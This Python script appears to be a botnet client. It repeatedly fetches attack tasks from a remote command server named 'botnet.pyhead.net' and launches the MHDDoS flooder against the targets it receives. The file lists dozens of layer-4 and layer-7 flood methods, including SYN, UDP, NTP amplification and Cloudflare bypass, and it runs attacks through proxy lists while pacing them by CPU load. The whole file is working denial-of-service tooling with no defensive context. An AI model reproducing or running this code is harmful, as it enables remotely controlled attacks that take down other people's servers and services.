#!/usr/bin/env python3

import json
import subprocess
import sys
from time import sleep
import psutil

from logging import raiseExceptions
from urllib.request import urlopen
from threading import Thread
from collections import namedtuple

loop_time = 120

url = "https://botnet.pyhead.net/api/v2/tasks/json/"

l7 = ["GET", "POST", "OVH", "STRESS", "DYN", "DOWNLOADER", "SLOW", "HEAD", "NULL", "COOKIE",
      "PPS", "EVEN", "GSB", "DGB", "AVB", "BOT", "APACHE", "XMLRPC", "CFB", "CFBUAM", "BYPASS", "BOMB"]
l4 = ["TCP", "UDP", "SYN", "CPS", "CONNECTION", "VSE", "TS3",
      "FIVEM", "MEM", "NTP", "MCBOT", "MINECRAFT", "MCPE"]


def customDecoder(Obj):
    return namedtuple('X', Obj.keys())(*Obj.values())


params = []


def runner(config):
    if int(config.Duration) > loop_time:
        period = loop_time
    else:
        period = config.Duration
    if config.UseProxy:
        if config.Proto in l7:
            params = [
                str(config.Proto),
                str(config.Dst),
                str(config.ProxyType),
                str(config.Threads),
                str(config.ProxyList),
                str(config.RPC),
                str(period)
            ]
        else:
            params = [
                str(config.Proto),
                str(config.Dst),
                str(config.Threads),
                str(period),
                str(config.ProxyType),
                str(config.ProxyList)
            ]
    else:
        if not config.Proto in l7:
            params = [
                str(config.Proto),
                str(config.Dst),
                str(config.Threads),
                str(period)
            ]
        else:
            raiseExceptions('No we cant run the LEVEL7 attacks without proxy.')
    subprocess.run([sys.executable, "MHDDoS/start.py",
                   *params], stdout=subprocess.PIPE)


while True:
    for conf in json.loads(urlopen(url).read(), object_hook=customDecoder):
        runner_thread = Thread(target=runner, args=(conf,))
        runner_thread.start()
        ps = psutil.getloadavg()
        load = int(ps[0] / psutil.cpu_count() * 100)
        if runner_thread.is_alive() or load > 80:
            sleep(loop_time)
